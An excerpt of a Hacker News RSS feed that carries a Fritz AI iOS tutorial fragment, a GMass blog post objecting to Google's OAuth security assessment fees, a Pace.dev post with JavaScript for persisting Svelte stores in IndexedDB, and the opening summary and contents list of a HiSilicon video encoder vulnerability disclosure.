https://miro.medium.com/max/1456/1*UB6l-L5ljrzWSMl5JD3Ksw.png 728w, https://miro.medium.com/max/1632/1*UB6l-L5ljrzWSMl5JD3Ksw.png 816w, https://miro.medium.com/max/1808/1*UB6l-L5ljrzWSMl5JD3Ksw.png 904w, https://miro.medium.com/max/1984/1*UB6l-L5ljrzWSMl5JD3Ksw.png 992w, https://miro.medium.com/max/2000/1*UB6l-L5ljrzWSMl5JD3Ksw.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*UB6l-L5ljrzWSMl5JD3Ksw.png?q=20"></p></div></div></div><figcaption>Figure 7: An example of images generated by Fritz Dataset Generator</figcaption></figure></div></div></div><div><p id="e748">At this point, you should have everything needed to start training a model. Keep in mind that you might need to go back in order to improve your seed images or add even more datasets after your first training iteration.</p></div></section><hr><section></section><hr><section><div><div><p id="6e50">The training part is for me the most well-conceived part of the process because it’s so easy to follow. It’s a simple step-by-step process that is clear in terms of what I’m looking for. Here are my preferences:</p><ul><li id="7e63">I want to use the dataset I generated</li><li id="35c9">I’m looking for an accurate model. The latency is more than acceptable (84ms on iPhone X) for me, since the objective is to point and detect/classify—no need to optimize for real-time inference p(more suitable for live video processing).</li></ul><p id="f903">The process is just easy and simple. You can choose your training budget, but if the model converges before, you won’t be charged for the rest, and an email will be sent to confirm that the model has finished training and is ready to download.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5760/1*7sIEYWdBfS5BLJFeqL_XEA.png" width="2880" height="1680" srcset="https://miro.medium.com/max/552/1*7sIEYWdBfS5BLJFeqL_XEA.png 276w, https://miro.medium.com/max/1104/1*7sIEYWdBfS5BLJFeqL_XEA.png 552w, https://miro.medium.com/max/1280/1*7sIEYWdBfS5BLJFeqL_XEA.png 640w, https://miro.medium.com/max/1456/1*7sIEYWdBfS5BLJFeqL_XEA.png 728w, https://miro.medium.com/max/1632/1*7sIEYWdBfS5BLJFeqL_XEA.png 816w, https://miro.medium.com/max/1808/1*7sIEYWdBfS5BLJFeqL_XEA.png 904w, https://miro.medium.com/max/1984/1*7sIEYWdBfS5BLJFeqL_XEA.png 992w, https://miro.medium.com/max/2000/1*7sIEYWdBfS5BLJFeqL_XEA.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*7sIEYWdBfS5BLJFeqL_XEA.png?q=20"></p></div></div></div><figcaption>Figure 8: The training step-by-step menu</figcaption></figure></div></div></div><div><div><p id="a027">By looking at your training job details, you can see when you submitted the job and when it completed. You can also see how long your model took to converge—mine took 5 hours and 13 minutes.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4964/1*TXY8_7U6rrgl8d93-x2xtw.png" width="2482" height="1232" srcset="https://miro.medium.com/max/552/1*TXY8_7U6rrgl8d93-x2xtw.png 276w, https://miro.medium.com/max/1104/1*TXY8_7U6rrgl8d93-x2xtw.png 552w, https://miro.medium.com/max/1280/1*TXY8_7U6rrgl8d93-x2xtw.png 640w, https://miro.medium.com/max/1400/1*TXY8_7U6rrgl8d93-x2xtw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*TXY8_7U6rrgl8d93-x2xtw.png?q=20"></p></div></div></div><figcaption>Figure 9: An overview of the training job</figcaption></figure><p id="3be8">We can download the <code>.mlmodel</code> file at this point and start experimenting with the model.</p></div></div></section><hr><section><div><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*Q6MudCXFB_eSZn2QUX4d3w.png" width="3264" height="739" srcset="https://miro.medium.com/max/552/1*Q6MudCXFB_eSZn2QUX4d3w.png 276w, https://miro.medium.com/max/1104/1*Q6MudCXFB_eSZn2QUX4d3w.png 552w, https://miro.medium.com/max/1280/1*Q6MudCXFB_eSZn2QUX4d3w.png 640w, https://miro.medium.com/max/1456/1*Q6MudCXFB_eSZn2QUX4d3w.png 728w, https://miro.medium.com/max/1632/1*Q6MudCXFB_eSZn2QUX4d3w.png 816w, https://miro.medium.com/max/1808/1*Q6MudCXFB_eSZn2QUX4d3w.png 904w, https://miro.medium.com/max/1984/1*Q6MudCXFB_eSZn2QUX4d3w.png 992w, https://miro.medium.com/max/2160/1*Q6MudCXFB_eSZn2QUX4d3w.png 1080w, https://miro.medium.com/max/2700/1*Q6MudCXFB_eSZn2QUX4d3w.png 1350w, https://miro.medium.com/max/3240/1*Q6MudCXFB_eSZn2QUX4d3w.png 1620w, https://miro.medium.com/max/3780/1*Q6MudCXFB_eSZn2QUX4d3w.png 1890w, https://miro.medium.com/max/4320/1*Q6MudCXFB_eSZn2QUX4d3w.png 2160w, https://miro.medium.com/max/4800/1*Q6MudCXFB_eSZn2QUX4d3w.png 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*Q6MudCXFB_eSZn2QUX4d3w.png?q=20"></p></div></div><figcaption>Figure 10: Create a new Single View Application</figcaption></figure></div><div><div><p id="73eb">Now we have our project ready to go. I don’t like using storyboards myself, so the app in this tutorial is built programmatically, which means no buttons or switches to toggle — just pure code.</p><blockquote><p id="ee0c"><strong>Editor’s note:</strong> If you need a demo camera-based app to get started and test model performance quickly, <a href="https://github.com/fritzlabs/fritz-examples" rel="noopener">check out our repo of demo projects for both iOS and Android</a>.</p></blockquote><p id="eb1f">To follow this method, you’ll have to delete the <code>main.storyboard</code> file and set your <code>SceneDelegate.swift</code> file (Xcode 11 &amp; 12 only).</p><p id="01e7">With Xcode 11 &amp; 12, you’ll have to change the <code>Info.plist</code> file like so:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3500/0*-rWtm5bD59baeAJP.png" width="1750" height="896" srcset="https://miro.medium.com/max/552/0*-rWtm5bD59baeAJP.png 276w, https://miro.medium.com/max/1104/0*-rWtm5bD59baeAJP.png 552w, https://miro.medium.com/max/1280/0*-rWtm5bD59baeAJP.png 640w, https://miro.medium.com/max/1400/0*-rWtm5bD59baeAJP.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*-rWtm5bD59baeAJP.png?q=20"></p></div></div></div><figcaption>Figure 11: delete the Storyboard Name from the .plist file</figcaption></figure><p id="e075">You need to delete the “Storyboard Name” in the file, and that’s about it.</p><p id="dae0">Change the <code>SceneDelegate</code> with the following code:</p><figure><div></div></figure><h2 id="2e94">Install Fritz pod package</h2><p id="ea2a">You’ll need to go to your project directory using your favorite terminal and type the following command:</p><pre><span id="eb4b">pod init</span></pre><p id="c232">Change the <code>Podfile</code> with the following text:</p><pre><span id="62f0"># If you are on Xcode 11<br>pod ‘Fritz’ <br># If you are on Xcode 12 beta<br>pod 'Fritz', '~&gt; 6.0.0-beta.1'</span></pre><p id="9bd7">When everything is installed, you should be able to open your <code>.xcworkspace</code> file.</p><h2 id="32ee">Add the model file in your project</h2><p id="f065">Import the <code>.mlmodel</code> downloaded from Fritz’s website, Xcode will handle everything. The next step is to extend the model’s class by adding the following code:</p><figure><div></div></figure><p id="05e8">You can replace <code>MODEL_IDENTIFIER</code> by going to Training -&gt; Select the Training Job -&gt; Copy the ID for the Core ML model file:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5760/1*H7DzGc4lwxclC2Q2YTVfug.png" width="2880" height="1671" srcset="https://miro.medium.com/max/552/1*H7DzGc4lwxclC2Q2YTVfug.png 276w, https://miro.medium.com/max/1104/1*H7DzGc4lwxclC2Q2YTVfug.png 552w, https://miro.medium.com/max/1280/1*H7DzGc4lwxclC2Q2YTVfug.png 640w, https://miro.medium.com/max/1400/1*H7DzGc4lwxclC2Q2YTVfug.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*H7DzGc4lwxclC2Q2YTVfug.png?q=20"></p></div></div></div><figcaption>Figure 12: Copy the model identifier</figcaption></figure><h2 id="6dec">Create View Controllers</h2><p id="1fc4">We need two ViewControllers:</p><ul><li id="d090"><code><strong>ViewController()</strong></code><strong>:</strong></li></ul><p id="0e42">This is where we’ll set our application entry point and set the camera view with the proper code to handle the model’s detection and classification.</p><ul><li id="00b7"><code><strong>RecipeViewController()</strong></code> :</li></ul><p id="e0af">This is where we will show the recipe with the list of products needed to cook or prepare the homemade version.</p><h2 id="6a72">Setup ViewController():</h2><p id="9bdb">Instantiate the controller’s properties:</p><ul><li id="0ed8">Instantiate the model class <code>SeedImagesAccurate</code>. When you add the <code>.mlmodel</code> file in your project, Xcode will parse it and automatically generate a helper class.</li><li id="6bc0">Instantiate an object of type <code>VNCoreMLReqest</code> that will handle the Core ML model predictions.</li><li id="9a78">Instantiate an object of type <code>VideoCapture</code> …</li></ul></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://heartbeat.fritz.ai/create-homemade-recipes-of-your-favorite-products-on-ios-using-fritz-ai-studio-c2c1a1fcc16d">https://heartbeat.fritz.ai/create-homemade-recipes-of-your-favorite-products-on-ios-using-fritz-ai-studio-c2c1a1fcc16d</a></em></p>]]>
            </description>
            <link>https://heartbeat.fritz.ai/create-homemade-recipes-of-your-favorite-products-on-ios-using-fritz-ai-studio-c2c1a1fcc16d</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516940</guid>
            <pubDate>Fri, 18 Sep 2020 14:07:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WTF: Google’s OAuth verification process and security assessment]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24516706">thread link</a>) | @JaneKCall
<br/>
September 18, 2020 | https://www.gmass.co/blog/google-oauth-verification-security-assessment/ | <a href="https://web.archive.org/web/*/https://www.gmass.co/blog/google-oauth-verification-security-assessment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-9167">
	<!-- <header class="entry-header"> -->
					<!-- <div class="entry-meta"> -->
							<!-- </div> -->
			<!-- </header> -->

	
	<div>
		<p>Last October, <a href="https://cloud.google.com/blog/products/g-suite/elevating-user-trust-in-our-api-ecosystems">Google announced that it would start being more stringent</a> with software vendors <strong>building apps on top of the Gmail API</strong>. Specifically,&nbsp;developers using a “restricted” or “sensitive” Gmail API scope would be subject to additional scrutiny and have to pay a fee of $15,000 – $75,000 <em>or more</em> to have a third party security assessment done. GMass leverages the power of the Gmail API to perform its magic, and so GMass has been subject to these measures.</p>
<p>Since Google’s announcement, the web&nbsp;has become rife with stories of frustration amongst smaller companies and independent developers who simply cannot afford the fee.&nbsp;This&nbsp;new policy stands to kill innovation, be the obstacle to side projects, and overall, make Gmail less useful. One of the primary reasons Gmail has been the email platform of choice for startups and tech companies is that it’s been extensible. There are&nbsp;<a href="https://www.producthunt.com/e/apps-for-gmail-email">hundreds, if not thousands,&nbsp;of extensions&nbsp;for Gmail</a>, one of which is GMass, that&nbsp;add functionality and make&nbsp;Gmail more useful than the base product. <em>Most of these applications&nbsp;will disappear.</em> Unless a product has reached the point of business sustainability, it won’t be worth it for most developers to pay the fee and go through the security process (which by the way, will likely cost more than the fee paid, because of development time necessary for remediation).</p>
<p>Well known extensions and Gmail apps like Boomerang, Yesware, Mixmax, and Mailtrack will likely pay the fee and succumb to the new governance, but smaller players like <a href="https://blog.context.io/context-io-deprecation-notice-ce8b77e6e477">Context.io</a> and <a href="https://www.voice2biz.com/oauth-2-0-for-google-apis-3rd-party-audit-costs-require-emailmonkey-to-shutdown/">EmailMonkey have already announced their plans to shut down</a>. I’ve also decided to shut down my other Gmail extension, Wordzen, because the fee is too high to be worth it for Wordzen.</p>
<p>This <a href="https://www.theregister.co.uk/2019/02/11/google_gmail_developer/">article from The Register</a>&nbsp;profiles two makers of Gmail apps, Leave Me Alone and Clean Email,&nbsp;and their frustrations with the new requirements.</p>
<p>Even a popular service like <a href="https://help.ifttt.com/hc/en-us/articles/360020249393-Important-update-about-Gmail-on-IFTTT">IFTTT&nbsp;is caving and reducing&nbsp;its Gmail functionality</a>.</p>
<h3>My stance</h3>
<ol>
<li>I’m not happy about it, but given the substantial GMass user base, we’re beginning the process of the security audit. You can follow my <a href="https://www.gmass.co/blog/live-updates-google-oauth-verification-security/">live updates of the OAuth verification process</a>.</li>
<li>I’m&nbsp;a proponent&nbsp;for greater security and protection of user data, but asking software developers to pay the security fee is ludicrous. Google should pay the fee on behalf of its developers (explanation below).</li>
<li>The opportunity is rife for a new email platform to make a dent in Gmail’s marketshare.</li>
<li>Prices for all Gmail apps, including GMass, will rise to cover the cost of the annual security assessment.</li>
<li>Google is grasping for straws when justifying making the developers pay. In response to the question “<b>Why is Google asking apps to pay for the security assessment?” </b>they state, “As we’ve pre-selected industry leading assessors, <strong>the letter of assessment your app will receive can be used for other certifications or customer engagements</strong> where a security assessment is needed.” <em>Gee thanks, Google, for&nbsp;making it easier for us to get more customer engagements.</em></li>
<li>Google’s support for developers who build Gmail apps has been poor, and&nbsp;the manner in which&nbsp;this issue is being handled is being done callously. Questions to the OAuth verification team go unanswered for long periods of time. Stack Overflow is <a href="https://stackoverflow.com/questions/tagged/gmail-api">littered with questions about the Gmail API</a>, mostly which go unanswered, <a href="https://developers.google.com/gmail/api/support">despite Google pointing developers to this area</a>. Google has been playing favorites with<a href="https://gsuite.google.com/marketplace/category/works-with-gmail"> Gmail Add-ons</a>, allowing only some to work on iOS while <a href="https://developers.google.com/gsuite/add-ons/guides/restrictions">claiming that iOS isn’t supported</a>, and not providing any context for its decisions. Additionally, Chrome extensions for Gmail have never been officially sanctioned,&nbsp;although when Gmail launched its new UI last year, it did inform all extension makers of the upcoming changes and provided test accounts. It’s clear that it’s up to developers to solve their own issues and work around Google’s platform shortcomings.</li>
</ol>
<h3>Conflict and Confusion</h3>
<p>There is also conflict and confusion amongst the information released by Google.</p>
<p><strong>Does this process only affect you if your users include gmail.com accounts, or do you have to go through the process even if you just take on G Suite users?</strong></p>
<p>The language in the announcements seem to indicate that&nbsp;this only affects gmail.com consumer accounts wanting access to an app.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/04/Screenshot-2019-04-30-17.32.31.png" alt="" width="1356" height="234">The&nbsp;use of the word “my”, however, in the question is confusing. It makes the question seem to apply to internal accounts only, those that are owned by the developer of the app. But then the answer references how G Suite administrators can control access, which implies that all external G Suite accounts are included in the group that are not impacted.</p>
<p>In the&nbsp;detailed FAQ about who can skip the review process, one would hope that for consistency with the above that it would say “Those apps that only service G Suite accounts and not consumer gmail.com accounts”&nbsp;but it doesn’t. Hmm.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/04/Screenshot-2019-04-30-17.34.49.png" alt="" width="1568" height="658"></p>
<p>Further in the FAQ, we find:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.36.05.png" alt="" width="1358" height="294">The first paragraph references “Google Accounts outside of your organization” which I interpret to include G Suite accounts outside of your organization. But then the second paragraph says that if you don’t verify, “access for new users will be disabled” and “existing grants for consumer accounts will be revoked”. I interpret that to mean that no new G Suite nor gmail.com users will be able to OAuth connect to your app, but existing G Suite users will still be able to.</p>
<p>Lastly, there’s this bit:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.37.35.png" alt="" width="1522" height="342">I’m thoroughly confused at this point.</p>
<p><strong>What happens if you choose to not go through the process? Will your app just show “Unverified” on the OAuth consent screen, or will it not have access to certain Gmail API scopes altogether?</strong></p>
<p>The documentation is also unclear on this issue. In the User Data Policy, we find:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.46.43.png" alt="" width="1828" height="478"></p>
<p>but this seems to conflict with what’s shown above:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.36.05.png" alt="" width="1358" height="294"></p>
<p>Finally this text under the “Sensitive Scope Verification” section seems to indicate that the only consequence of not having your app verified is that users will see that it’s Unverified.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.49.53.png" alt="" width="1458" height="488"></p>
<p>However, there’s no equivalent question under the “Restricted Scope Verification” section:</p>
<figure id="attachment_4202" aria-describedby="caption-attachment-4202"><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.56.27.png" alt="" width="1534" height="1282"><figcaption id="caption-attachment-4202">They really should include the question: “What happens if I don’t verify my app?”</figcaption></figure>
<p>It would&nbsp;be preferable for the entire developer community if the only consequence of not verifying a sensitive scope app is that users see the “Unverified” designation when connecting their accounts because it allows users to still use their apps. Personally I&nbsp;wouldn’t mind if GMass users go to connect their accounts and see that the app is “unverified”,&nbsp;if it weren’t for the <a href="https://www.dropbox.com/s/v2ipv5oot4qqtwc/Screenshot%202019-05-01%2001.54.43.png?dl=0">100 user cap that is imposed on Unverified Apps</a>. But again, this is only clear for sensitive scope apps and not restricted scope apps.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.54.43.png" alt="" width="1568" height="614"></p>
<h3>The scope of the security audit</h3>
<p>In the <a href="https://support.google.com/cloud/answer/9110914">FAQ</a>, Google states “we are requiring apps that store data on non-Google servers to demonstrate a minimum level of capability in handling data securely and deleting user data upon user request.” But deeper in the FAQ, the&nbsp;audit also includes developer’s code deployment practices, which seems to go beyond a minimal level in capability in handling data securely.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/google-oauth-security-audit-web.png" alt="" width="518" height="1371"><br>
<em>Google is in a position of power over its third party developers.</em> After all, where are the developers going to go? We’ve all invested substantially into building our products, many of us make a living off of what we’ve built, so we if we don’t play by the new rules, it would mark an end to our careers. We could go and build on Outlook.com’s API instead, but with just two players — Google and Microsoft — dominating the email ecosystem, there’s no guarantee that Microsoft won’t implement the same policies. Such is the risk of building a product on top of someone else’s.</p>
<h3>Why Google&nbsp;should pay the fee instead</h3>
<p>They can afford to, and it offers a checks and balances between the security firms and Google that doesn’t exist right now. While developers benefit from building software on top of Gmail, Google too derives benefit from attracting customers to a product that has been made better by all of its third party developers. There are users of Gmail and G Suite that would NOT be users if it weren’t for their loyalty to a particular third party app. I know for certain that in GMass’s case, we’ve&nbsp;brought users to G Suite because they wanted to use GMass.</p>
<h3>Resources on&nbsp;the new Google OAuth scope policy</h3>
<p>Google’s <a href="https://cloud.google.com/blog/products/g-suite/elevating-user-trust-in-our-api-ecosystems">original announcement</a> <span>(cloud.google.com)</span>.</p>
<p>The <a href="https://developers.google.com/terms/api-services-user-data-policy">user data policy</a> <span>(developers.google.com)</span>.</p>
<p>Detailed <a href="https://support.google.com/cloud/answer/9110914?hl=en&amp;ref_topic=3473162">FAQ</a> on the verification process and the security assessment <span>(support.google.com)</span>.</p>
<p>Indie Hackers <a href="https://www.indiehackers.com/forum/psa-new-google-policy-creates-15k-barrier-to-entry-for-apps-using-the-gmail-api-08070e6e4c">discussion</a> of the issue <span>(indiehackers.com)</span>.</p>
<p><a href="https://groups.google.com/forum/#!topic/inboxsdk/6NLvQL-5bic">Inbox SDK discussion</a> on the issue <span>(groups.google.com)</span>.</p>
<div itemtype="http://schema.org/Person" itemscope="" itemprop="author"><p><img alt="" src="https://secure.gravatar.com/avatar/836da7a343d034a72cb44fb28580efe6?s=100&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/836da7a343d034a72cb44fb28580efe6?s=200&amp;d=mm&amp;r=g 2x" height="100" width="100" itemprop="image"></p><div><p>Ajay is the founder of GMass and has been developing email sending software for 20 years.</p></div></div></div><!-- .entry-content -->

	<!-- <footer class="entry-footer"> -->
			<!-- </footer> -->

</article></div>]]>
            </description>
            <link>https://www.gmass.co/blog/google-oauth-verification-security-assessment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516706</guid>
            <pubDate>Fri, 18 Sep 2020 13:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Passive user preferences with persisted stores in Svelte]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24516485">thread link</a>) | @jerodsanto
<br/>
September 18, 2020 | https://pace.dev/blog/2020/09/09/simple-user-preferences-with-persisted-stores-svelte.html | <a href="https://web.archive.org/web/*/https://pace.dev/blog/2020/09/09/simple-user-preferences-with-persisted-stores-svelte.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div uk-lightbox="toggle:.lightbox-toggle">
<h2 id="the-case-for-passive-preferences-1">The case for passive preferences</h2><p>In <a href="https://pace.dev/" rel="nofollow">Pace.dev</a> users customise their experience passively as they interact with the UI.</p>
<p>We achieve this by remembering their settings for next time in the browser’s data store. <strong>This little trick turns out to deliver a pretty powerful user experience punch.</strong></p>
<p>A few examples of this include our <em>Send on enter</em> toggle in comment boxes, the <em>light/dark mode</em> setting, and the <em>number of cards</em> to display per page.</p>
<p>If the user picks ten cards per page, they are probably on a smaller device. Pace will remember to show them ten cards per page for the foreseeable. Since the storage is in the browser, the same account on different machines will have different preferences by default - which works well for us in our case.</p>
<p>There might be something interesting that a user experience expert could tell us about how this behaviour mirrors the real world; if you open a drawer, it stays open until you close it.</p>
<p>It is a very effective <em>passive</em> way that users can set their preferences.</p>
<h2 id="stores-in-svelte-2">Stores in Svelte</h2>
<p>Stores in Svelte provide a mechanism by which components can <em>subscribe</em> to changes in data. So we can put the <em>number of cards</em> value into a store, and any component that cares about that data will be notified when it changes.</p>
<p>Svelte adds some nice (and more importantly, easy to learn) syntactic sugar around stores, so <em>subscribing</em> is as simple as mentioning the store with a <code>$</code> prefix.</p>
<ul>
<li>You can learn more about stores in Svelte at <a href="https://svelte.dev/docs#svelte_store" rel="nofollow">https://svelte.dev/docs#svelte_store</a></li>
</ul>
<h3 id="using-stores-in-svelte-3">Using stores in Svelte</h3>
<p>In Pace, we have a <code>stores.svelte</code> file that contains code like this:</p>
<pre><code>&lt;script lang='ts' context='module'&gt;

	import { writable } from 'svelte/store'
	export const hasUnreadItems = writable(false)

&lt;/script&gt;
</code></pre>
<p>The <code>writable</code> function creates a mutable store.</p>
<p>In our components we import <code>hasUnreadItems</code> and refer to it in template code with the <code>$</code> prefix.</p>
<pre><code>&lt;script lang='ts'&gt;
	import { hasUnreadItems } from '/stores.svelte'
&lt;/script&gt;
{#if $hasUnreadItems}
	&lt;div&gt;...&lt;/div&gt;
{/if}
</code></pre>
<p>In our <code>App.svelte</code> we have some code running that is checking for unread items.</p>
<p>When the event occurs, we use the <code>set</code> method to update the store.</p>
<pre><code>import { hasUnreadItems } from '/stores.svelte'

function onHasUnreadItems() {
	hasUnreadItems.set(true)
}
</code></pre>
<p>When we call <code>hasUnreadItems.set</code>, the <code>if</code> condition in the component above will be reevaluated, and the app will update accordingly.</p>
<h3 id="making-stores-persistent-4">Making stores persistent</h3>
<p>Stores in Svelte are in-memory, and so are scoped to the page.</p>
<p>We wanted to persist the values between page refreshes in the
simplest way possible.</p>
<p>The store API in Svelte is very minimalistic, which makes it easy to implement
ourselves, and even build functionality on top of other stores.</p>
<p>Our <code>persistable</code> function uses a store internally and provides alternative
functions for <code>set</code> and <code>update</code> which call out to other functions to persist and
retrieve the values.</p>
<p>In this case, we store the values in the IndexedDB.</p>
<p>Here’s the entire code in JavaScript:</p>
<pre><code>/*
 * Svelte persistent store that saves to IndexedDB.
 * 
 * Usage, store.js:
 * export const count = persistable('count', 0)
 */
export function persistable(key, defaultValue) {
	let currentValue = defaultValue
	const { subscribe, set, update } = writable(defaultValue)
	try {
		getUserPreference(key).then(persisted =&gt; {
			if (persisted &amp;&amp; persisted.Value !== undefined) {
				currentValue = persisted.Value
				set(persisted.Value)
			}
		})
	} catch (error) {
		console.warn(error)
	}
	function persistentSet(value) {
		currentValue = value
		set(value)
		try {
			putUserPreference(key, value)
		} catch (error) {
			console.warn(error)
		}
	}
	function persistentUpdate(fn) {
		persistentSet(fn(currentValue))
	}
	return {
		subscribe,
		set: persistentSet,
		update: persistentUpdate,
	}
}
</code></pre>
<p>By intercepting calls to the store, we are able to do additional work before passing execution to the store underneath (the one we created when we called <code>writable</code>).</p>
<p>We get the usual behaviour of the store, as well as calls out to our own persistence functions.</p>
<p>Any errors that occur are warned to the console, but we don’t worry too much; the store will continue to work as normal, it’s just the persistence that has failed. At least it gracefully degrades on browsers without IndexedDB support.</p>
<h3 id="persisting-values-5">Persisting values</h3>
<p>The <code>getUserPreference</code> and <code>putUserPreference</code> functions make up a promise based API that persists, and looks up values by a <code>key</code>.</p>
<p>These days developers have lots of options when it comes to storing data in the browser. We built our solution on top of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API" rel="nofollow">IndexedDB browser API</a> using <a href="https://dexie.org/" rel="nofollow">Dexie.js</a> out of a technical curiosity, and are pretty happy with it.</p>
<pre><code>// create a database
let userPreferencesDB = new Dexie('pace-user-preferences')
userPreferencesDB.version(1).stores({
	'user_preferences': '[key],value',
})

export function putUserPreference(key, value) {
	userPreferencesDB['user_preferences'].put({
		key: key,
		value: value,
	})
}

export function getUserPreference(key) {
	return userPreferencesDB['user_preferences'].get([key])
}
</code></pre>
<blockquote>
<p>You could easily write different <code>putUserPreference</code> and <code>getUserPreference</code> implementations to persist the values elsewhere - even on a remote server if you want to sync across devices.</p>
</blockquote>
<h2 id="using-our-new-api-6">Using our new API</h2>
<p>The <code>persistable</code> function mirrors Svelte’s stores API, which makes it a drop-in replacement for any calls to <code>writable</code>.</p>
<p>To make a store persist, all we need to do is create it with a call to <code>persistable</code> instead, passing in a unique string key for each one.</p>
<hr>
<h2>
Learn more about what we're doing at Pace.
</h2>
<p>
A lot of our blog posts come out of the technical work behind a project we're
working on called Pace.
</p>
<p>
We were frustrated by communication and project management tools that interrupt your flow and
overly complicated workflows turn simple tasks, hard. <span>So we decided to build Pace.</span>
</p>
<p>
Pace is a new minimalist project management tool for tech teams. We promote <strong>asynchronous
communication</strong> by default, while allowing for those times when you really need to chat.
</p>
<p>
We shift the way work is assigned by allowing only <strong>self-assignment</strong>, creating a more empowered team
and protecting the attention and focus of devs.
</p>
<p>
We're currently live and would love you to try it and share your
opinions on what project management tools should and shouldn't do.
</p>
<p>
<strong>What next?</strong>
<a href="https://pace.dev/">Start your 14 day free trial to see if Pace is right for your team</a>
</p>
</div><p>
Thank you, <strong>we don't do ads</strong> so we rely on you to spread the word.
</p></div>]]>
            </description>
            <link>https://pace.dev/blog/2020/09/09/simple-user-preferences-with-persisted-stores-svelte.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516485</guid>
            <pubDate>Fri, 18 Sep 2020 13:29:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Backdoors and other vulnerabilities in HiSilicon based hardware video encoders]]>
            </title>
            <description>
<![CDATA[
Score 188 | Comments 63 (<a href="https://news.ycombinator.com/item?id=24516453">thread link</a>) | @blablablub
<br/>
September 18, 2020 | https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/ | <a href="https://web.archive.org/web/*/https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>15 Sep 2020</span></p><p><img src="https://kojenov.com/assets/2020-09-15-encoders/010-title-bug.png" alt="bug"></p>

<hr>

<p><strong>Update 2020-09-17:</strong> Huawei <a href="https://www.huawei.com/en/psirt/security-notices/2020/huawei-sn-20200917-01-hisilicon-en">issued a statement</a> saying that none of the vulnerabilities have been introduced by HiSilicon chips and SDK packages. I will update this article as more information comes in.</p>

<hr>

<p>This article discloses critical vulnerabilities in IPTV/H.264/H.265 video encoders based on HiSilicon hi3520d hardware. The vulnerabilities exist in the application software running on these devices. All vulnerabilities are exploitable remotely and can lead to sensitive information exposure, denial of service, and remote code execution resulting in full takeover of the device. With multiple vendors affected, and no complete fixes at the time of the publication, these encoders should only be used on fully trusted networks behind firewalls. I hope that my detailed write-up serves as a guide for more security research in the IoT world.</p>

<!--more-->

<ul id="markdown-toc">
  <li><a href="#summary" id="markdown-toc-summary">Summary</a></li>
  <li><a href="#background" id="markdown-toc-background">Background</a></li>
  <li><a href="#hardware" id="markdown-toc-hardware">Hardware</a></li>
  <li><a href="#network-recon" id="markdown-toc-network-recon">Network recon</a>    <ul>
      <li><a href="#23---telnet" id="markdown-toc-23---telnet">23 - telnet</a></li>
      <li><a href="#80-8086---web-application" id="markdown-toc-80-8086---web-application">80, 8086 - web application</a></li>
      <li><a href="#554-8554---rtsp" id="markdown-toc-554-8554---rtsp">554, 8554 - RTSP</a></li>
      <li><a href="#1935---rtmp" id="markdown-toc-1935---rtmp">1935 - RTMP</a></li>
      <li><a href="#5150---serial-to-tcp" id="markdown-toc-5150---serial-to-tcp">5150 - serial to TCP</a></li>
      <li><a href="#9588---another-web-server" id="markdown-toc-9588---another-web-server">9588 - another web server</a></li>
    </ul>
  </li>
  <li><a href="#firmware-analysis" id="markdown-toc-firmware-analysis">Firmware analysis</a>    <ul>
      <li><a href="#content" id="markdown-toc-content">Content</a></li>
      <li><a href="#password-file-and-telnet-access" id="markdown-toc-password-file-and-telnet-access">Password file and telnet access</a></li>
    </ul>
  </li>
  <li><a href="#local-recon" id="markdown-toc-local-recon">Local recon</a>    <ul>
      <li><a href="#the-base-system" id="markdown-toc-the-base-system">The base system</a></li>
      <li><a href="#processes" id="markdown-toc-processes">Processes</a></li>
      <li><a href="#ports" id="markdown-toc-ports">Ports</a></li>
      <li><a href="#dumping-the-file-system" id="markdown-toc-dumping-the-file-system">Dumping the file system</a></li>
    </ul>
  </li>
  <li><a href="#reverse-engineering" id="markdown-toc-reverse-engineering">Reverse engineering</a>    <ul>
